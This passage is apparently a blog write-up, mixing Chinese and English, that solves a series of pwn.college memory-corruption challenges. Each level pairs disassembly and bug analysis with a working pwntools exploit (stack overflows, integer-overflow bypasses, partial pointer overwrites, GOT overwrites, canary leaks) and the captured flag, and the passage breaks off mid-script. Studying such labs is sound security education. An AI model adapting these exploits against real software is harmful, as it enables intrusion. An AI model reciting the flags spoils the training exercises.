+<code>read()</code> 并被强制类型转换为无符号的 <code>size_t</code>
+时，在 Two’s Complement (二进制补码) 的规则下，<code>-1</code>
+的内存表示 <code>0xffffffffffffffff</code>
+会变成一个极其巨大的正数。</p>
+<h2 id="exploit-2">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/bounds-breaker-easy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x7ffea42aa208</span> - <span class="number">0x7ffea42aa1b0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * padding + p64(<span class="number">0x40198c</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{4UZ8-8id5DaJFXvOX8jKVcIscGE.0VN5IDL4cjM1gzW}</span></span>
+<h1 id="bounds-breaker-hard">Bounds Breaker (Hard)</h1>
+<h2 id="analysis-3">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/bounds-breaker-hard</span><br><span class="line">            ; CALL XREF from main @ 0x402222(x)</span><br><span class="line">┌ 362: sym.challenge (char **arg1, char **arg2, int64_t arg3);</span><br><span class="line">│ `- args(RDI, RSI, RDX) vars(20:sp[0x10..0xb0])</span><br><span class="line">; ...</span><br><span class="line">│           0x0040208c      488945f8       mov qword [buf], RAX</span><br><span class="line">│           0x004020c1      e8baf0ffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x004020cc      83f86a         cmp eax, 0x6a               ; <span class="string">&#x27;j&#x27;</span> ; 106</span><br><span class="line">│       ┌─&lt; 0x004020cf      7e16           jle 0x4020e7</span><br><span class="line">; ...</span><br><span class="line">│           0x00402114      e837f0ffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>buf</code> -&gt; <code>RBP - 0x80</code></li>
+<li>padding -&gt; <code>0x80 + 8</code> = 136</li>
+<li><code>win</code> -&gt; <code>0x00401ef0</code></li>
+</ul>
+<p>Same trick as easy version, using signed <code>-1</code> to bypass
+the <code>jle 106</code> check.</p>
+<h2 id="exploit-3">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/bounds-breaker-hard&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">136</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * padding + p64(<span class="number">0x401ef0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{I8YM8h8FYgC-CWSTAsEzsyV1c6v.0lN5IDL4cjM1gzW}</span></span>
+<h1 id="casting-catastrophe-easy">Casting Catastrophe (Easy)</h1>
+<blockquote>
+<p>Overflow a buffer and smash the stack to obtain the flag, but this
+time bypass another check designed to prevent you from doing so!</p>
+</blockquote>
+<h2 id="analysis-4">Analysis</h2>
+<p>核心漏洞是 <strong>32-bit integer multiplication
+overflow</strong>。</p>
+<p>The <code>imul eax, edx</code> check uses 32-bit multiplication. If
+<code>record_num = 42949673</code> and <code>record_size = 100</code>,
+then <code>42949673 * 100 = 4294967300 = 0x100000004</code>. After
+truncation to 32 bits, the result becomes <code>0x00000004</code>, which
+happily passes the <code>&lt;= 119</code> check.</p>
+<ul>
+<li>buffer address: <code>0x7ffcb2c40f30</code></li>
+<li>return address: <code>0x7ffcb2c40fc8</code></li>
+<li>padding = 152 bytes</li>
+</ul>
+<h2 id="exploit-4">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;warning&#x27;</span></span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&#x27;/challenge/casting-catastrophe-easy&#x27;</span></span><br><span class="line">exe = ELF(binary_path, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p = process(binary_path)</span><br><span class="line"></span><br><span class="line">record_num = <span class="string">b&quot;42949673&quot;</span></span><br><span class="line">record_size = <span class="string">b&quot;100&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(record_num)</span><br><span class="line">p.sendline(record_size)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">152</span></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * padding + p64(exe.sym[<span class="string">&#x27;win&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{k3b5vnCTtezRHjL8K5QJGkTcHuE.01N5IDL4cjM1gzW}</span></span>
+<h1 id="casting-catastrophe-hard">Casting Catastrophe (Hard)</h1>
+<h2 id="analysis-5">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/casting-catastrophe-hard</span><br><span class="line"><span class="comment"># buf -&gt; RAX -&gt; var_30h -&gt; RBP - 0x30</span></span><br><span class="line">│           0x00401fec      83f816         cmp eax, 0x16               ; 22</span><br><span class="line">│       ┌─&lt; 0x00401fef      761f           jbe 0x402010</span><br></pre></td></tr></table></figure>
+<p>Same 32-bit multiplication overflow trick as easy, just with a much
+smaller buffer. Here the bound is only <code>22</code> bytes and
+<code>buf</code> lives at <code>RBP - 0x30</code>.</p>
+<ul>
+<li>padding = <code>0x30 + 8</code> = 56 bytes</li>
+</ul>
+<h2 id="exploit-5">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;warning&quot;</span></span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;/challenge/casting-catastrophe-hard&quot;</span></span><br><span class="line">exe = ELF(binary_path, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p = process(binary_path)</span><br><span class="line"></span><br><span class="line">record_num = <span class="string">b&quot;42949673&quot;</span></span><br><span class="line">record_size = <span class="string">b&quot;100&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(record_num)</span><br><span class="line">p.sendline(record_size)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">56</span></span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * padding + p64(exe.sym[<span class="string">&quot;win&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{44Gjyw7y3rCOCpE8CMg-lX3RMzO.0FO5IDL4cjM1gzW}</span></span>
+<h1 id="pointer-problems-easy">Pointer Problems (Easy)</h1>
+<blockquote>
+<p>Leverage memory corruption to leak the flag.</p>
+</blockquote>
+<h2 id="analysis-6">Analysis</h2>
+<p>这题的核心不是 ret2win，而是 <strong>partial pointer
+overwrite</strong>。</p>
+<p>The low bytes of the <code>char*</code> differ between runs because
+of ASLR, but the higher bytes stay aligned closely enough that a short
+partial overwrite still works.</p>
+<ul>
+<li>flag is near BSS <code>0x5060</code> (<code>obj.bssdata</code>)</li>
+<li><code>need_overwrite</code> = <code>0x7fff67f0f7b0</code></li>
+<li><code>buffer_address</code> = <code>0x7fff67f0f760</code></li>
+<li>padding = 80 bytes</li>
+</ul>
+<p>We overwrite the low 2 bytes of the pointer with
+<code>0x5060</code>.</p>
+<h2 id="exploit-6">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/challenge/pointer-problems-easy&quot;</span></span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p16(<span class="number">0x5060</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(path)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset+<span class="number">2</span>).encode())</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Success on Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{8mxldk5zAFKNhxJWkA9vMtAZPLd.QXygzN4EDL4cjM1gzW}</span></span>
+<h1 id="pointer-problems-hard">Pointer Problems (Hard)</h1>
+<h2 id="analysis-7">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacker@program-security~pointer-problems-hard:~$ r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/pointer-problems-hard</span><br><span class="line">; BSS data address -&gt; 0x4040</span><br><span class="line">│           0x00001899      488d05a027..   lea RAX, obj.bssdata        ; 0x4040</span><br><span class="line">; buf -&gt; RBP - 0x60, string pointer at RBP - 0x10</span><br><span class="line">; padding = 0x60 - 0x10 = 0x50 = 80 bytes</span><br></pre></td></tr></table></figure>
+<p>Same trick as easy. We don’t need the full pointer, only the low
+bytes that redirect the stack string pointer into the flag buffer in
+<code>.BSS</code>.</p>
+<h2 id="exploit-7">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/challenge/pointer-problems-hard&quot;</span></span><br><span class="line">offset = <span class="number">80</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p16(<span class="number">0x4040</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(path)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset + <span class="number">2</span>).encode())</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Success on Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{gISXStoHI3uPCfeOHg3yKKOefCg.QXzgzN4EDL4cjM1gzW}</span></span>
+<h1 id="anomalous-array-easy">Anomalous Array (Easy)</h1>
+<blockquote>
+<p>Leverage an Array to obtain the flag.</p>
+</blockquote>
+<h2 id="analysis-8">Analysis</h2>
+<p>这题其实是 <strong>OOB
+read</strong>，只是包装成“查看数组元素”。数组在栈的高地址，flag
+在更低的地址，所以思路是使用 <strong>negative index</strong>。</p>
+<ul>
+<li>array start: <code>0x7fffcfc10c98</code></li>
+<li>flag address: <code>0x7fffcfc106d0</code></li>
+<li>distance: <code>0x7fffcfc10c98 - 0x7fffcfc106d0 = 1480</code>
+bytes</li>
+<li>element size: 8 bytes</li>
+<li>index: <code>1480 / 8 = 185</code> -&gt; use <code>-185</code></li>
+</ul>
+<h2 id="exploit-8">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">185</span>, -<span class="number">170</span>):</span><br><span class="line">    p = process(<span class="string">&#x27;/challenge/anomalous-array-easy&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Which number would you like to view?&quot;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your hacker number is &quot;</span>)</span><br><span class="line">    val = p.recvline().strip().decode().zfill(<span class="number">16</span>)</span><br><span class="line">    chunk = <span class="built_in">bytes</span>.fromhex(val)[::-<span class="number">1</span>]</span><br><span class="line">    flag += chunk</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;&#125;&quot;</span> <span class="keyword">in</span> chunk:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] flag: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{0DcG-T7IqYV0QKtiZidy4E-xZUh.QX0gzN4EDL4cjM1gzW}</span></span>
+<h1 id="anomalous-array-hard">Anomalous Array (Hard)</h1>
+<blockquote>
+<p>Leverage an Array to obtain the flag.</p>
+</blockquote>
+<h2 id="analysis-9">Analysis</h2>
+<p>Same approach as easy version, using a negative array index to read
+the flag from memory.</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{…}</span></span>
+<h1 id="now-you-got-it-easy">Now You GOT It (Easy)</h1>
+<blockquote>
+<p>Leverage an Array to obtain the flag.</p>
+</blockquote>
+<h2 id="analysis-10">Analysis</h2>
+<p>这题从越界读写切到 <strong>GOT overwrite</strong>。</p>
+<ul>
+<li><code>win</code> function: <code>0x1a72</code></li>
+<li>GOT base: <code>0x5000</code></li>
+<li>array base: <code>0x57c0</code></li>
+<li>offset: <code>0x5000 - 0x57c0 = -0x7c0</code> (-1984 bytes)</li>
+<li>index: <code>-1984 / 8 = -248</code></li>
+</ul>
+<p>We overwrite <code>putchar@GOT</code> with the address of
+<code>win()</code>.</p>
+<h2 id="exploit-9">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/challenge/now-you-got-it-easy&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;/challenge/now-you-got-it-easy&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate index based on binary layout</span></span><br><span class="line"><span class="comment"># puts_addr - array_addr</span></span><br><span class="line">index = (elf.got[<span class="string">&quot;putchar&quot;</span>] - <span class="number">0x57C0</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;FREE LEAK: win is located at: &quot;</span>)</span><br><span class="line">win_addr = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Which number would you like to view? &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What number would you like to replace it with? &quot;</span>, <span class="built_in">str</span>(win_addr).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{YHBFpvTU6V94JGyRaW-ZtWT0Zlv.QX2gzN4EDL4cjM1gzW}</span></span>
+<h1 id="now-you-got-it-hard">Now You GOT It (Hard)</h1>
+<blockquote>
+<p>Leverage an Array to obtain the flag.</p>
+</blockquote>
+<h2 id="analysis-11">Analysis</h2>
+<p>Hard 版的关键变化是，不能像 Easy 那样直接把 <code>puts@GOT</code>
+指到 <code>win</code> 入口，否则 <code>win</code> 自己内部先调用
+<code>puts</code>，马上递归爆炸。</p>
+<p><strong>解法：offset jump (偏移跳转)</strong></p>
+<p>看看 <code>win</code> 函数开头：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00001e84      f30f1efa       endbr64</span><br><span class="line">0x00001e88      55             push RBP</span><br><span class="line">0x00001e89      4889e5         mov RBP, RSP</span><br><span class="line">0x00001e8c      488d3d7511..   lea RDI, str.You_win__Here_is_your_flag:</span><br><span class="line">0x00001e93      e878f2ffff     call sym.imp.puts     &lt;-- 死循环点</span><br><span class="line">0x00001e98      be00000000     mov esi, 0            &lt;-- 我们从这里开始！</span><br></pre></td></tr></table></figure>
+<p>如果我们把 <code>puts@GOT</code> 覆盖为 <code>win_addr + 0x14</code>
+(即 <code>0x1e98</code>)，就能绕过死循环。</p>
+<h2 id="exploit-10">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/challenge/now-you-got-it-hard&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;/challenge/now-you-got-it-hard&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># array starts at 0x5dd0 relative</span></span><br><span class="line">index = (elf.got[<span class="string">&quot;puts&quot;</span>] - <span class="number">0x5dd0</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;FREE LEAK: win is located at: &quot;</span>)</span><br><span class="line">win_addr = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>) + <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Which number would you like to view? &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;What number would you like to replace it with? &quot;</span>, <span class="built_in">str</span>(win_addr).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{4R4AKNBLpYoKyJi6oIUwiWfpZI5.QX3gzN4EDL4cjM1gzW}</span></span>
+<h1 id="loop-lunacy-easy">Loop Lunacy (Easy)</h1>
+<blockquote>
+<p>Overflow a buffer and smash the stack to obtain the flag, but this
+time in a PIE binary with a stack canary.</p>
+</blockquote>
+<h2 id="analysis-12">Analysis</h2>
+<p>这一题的重点不是直接越过 canary，而是改写循环计数变量
+<code>n</code>，让后续单字节写入直接跳到 canary 后面。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (n &lt; size) &#123;</span><br><span class="line">    n += read(<span class="number">0</span>, input + n, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>buf</code> -&gt; <code>0x7fff2243c7e0</code></li>
+<li><code>n</code> -&gt; <code>0x7fff2243c83c</code> (offset 92)</li>
+<li>return address -&gt; <code>0x7fff2243c858</code> (offset 120)</li>
+</ul>
+<p>我们覆盖 <code>n</code> 为 119，下一次 <code>read</code> 就会写入到
+<code>input + 120</code>，即 return address 的位置。</p>
+<h2 id="exploit-11">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding to n</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">92</span> + p8(<span class="number">119</span>) + p16(<span class="number">0x1CF9</span>) <span class="comment"># target win_authed check skip</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/challenge/loop-lunacy-easy&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;122&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{cTAXWFaqIFSJDGH8jZMVtQUXTPF.0VNwMDL4cjM1gzW}</span></span>
+<h1 id="loop-lunacy-hard">Loop Lunacy (Hard)</h1>
+<h2 id="analysis-13">Analysis</h2>
+<p>Hard 版还是同样的单字节循环写入，只是局部变量布局稍微绕一点。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>RBP - 0x40</code> (64 bytes)</li>
+<li><code>n</code> -&gt; <code>RBP - 0x58</code></li>
+<li><code>buf</code> to <code>n</code> offset = 48 bytes</li>
+<li>target <code>win_authed</code> offset -&gt; <code>0x1481</code></li>
+</ul>
+<h2 id="exploit-12">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite n to point to return address</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">48</span> + p8(<span class="number">64</span> + <span class="number">8</span> - <span class="number">1</span>) + p16(<span class="number">0x1481</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/loop-lunacy-hard&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;74&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    a = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{AYNJAU4YM4hhzf7JinEkwYZfMVn.0lNwMDL4cjM1gzW}</span></span>
+<h1 id="nosy-neighbor-easy">Nosy Neighbor (Easy)</h1>
+<blockquote>
+<p>Overflow a buffer and leak the flag.</p>
+</blockquote>
+<h2 id="analysis-14">Analysis</h2>
+<p>这一题是典型的字符串越界泄露。<code>printf("%s")</code>
+会一直打印到遇见 <code>\x00</code> 为止。</p>
+<ul>
+<li><code>buf</code> -&gt; <code>0x7ffcec871790</code></li>
+<li><code>flag</code> -&gt; <code>0x7ffcec8717f1</code></li>
+<li>offset -&gt; 97 bytes</li>
+</ul>
+<h2 id="exploit-13">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;/challenge/nosy-neighbor-easy&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;97&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span> * <span class="number">97</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{Me-6tE1p3dFRGXTXtpMORPj5b_W.01NwMDL4cjM1gzW}</span></span>
+<h1 id="nosy-neighbor-hard">Nosy Neighbor (Hard)</h1>
+<h2 id="analysis-15">Analysis</h2>
+<p>Hard 版也是同一类 bug，输入是从 <code>path</code>
+开始写，真正的可打印缓冲区在 <code>path + 0x6d</code>。</p>
+<ul>
+<li>offset -&gt; <code>0x6d</code> -&gt; 109</li>
+</ul>
+<h2 id="exploit-14">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;/challenge/nosy-neighbor-hard&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;109&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span> * <span class="number">109</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{EtNjf_nSDtmYIx3VjpoxbpZVdLa.0FOwMDL4cjM1gzW}</span></span>
+<h1 id="recursive-ruin-easy">Recursive Ruin (Easy)</h1>
+<blockquote>
+<p>Defeat a stack canary in a PIE binary by utilizing a bug left in the
+binary.</p>
+</blockquote>
+<h2 id="analysis-16">Analysis</h2>
+<p>这题利用 <strong>recursive backdoor</strong>。第一次输入泄露 canary
+并让同一个进程再次进入 <code>challenge()</code>，复用同一个 canary。</p>
+<ol type="1">
+<li><strong>第一发 Payload (Information Leak)</strong>: 覆盖 canary
+的最低字节 (<code>\x00</code>)，利用 <code>printf</code> 泄露剩余 7
+字节。加入 <code>"REPEAT"</code> 触发递归。</li>
+<li><strong>第二发 Payload (Control Flow Hijack)</strong>: 在第二层
+<code>challenge()</code> 中，利用泄露的 canary 构造 payload
+绕过检查。</li>
+</ol>
+<h2 id="exploit-15">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    p = process(<span class="string">&quot;/challenge/recursive-ruin-easy&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;137&quot;</span>)</span><br><span class="line">        payload1 = <span class="string">b&quot;REPEAT&quot;</span>.ljust(<span class="number">136</span>, <span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot;X&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&quot;You said: &quot;</span>)</span><br><span class="line">        p.recv(<span class="number">137</span>)</span><br><span class="line">        canary = <span class="string">b&quot;\x00&quot;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;Payload size:&quot;</span>, <span class="string">b&quot;154&quot;</span>)</span><br><span class="line">        payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">136</span> + canary + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\xb3\x83&quot;</span></span><br><span class="line">        p.sendafter(<span class="string">b&quot;bytes)!\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">        result = p.recvall(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result.decode())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>: p.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.count():</span><br><span 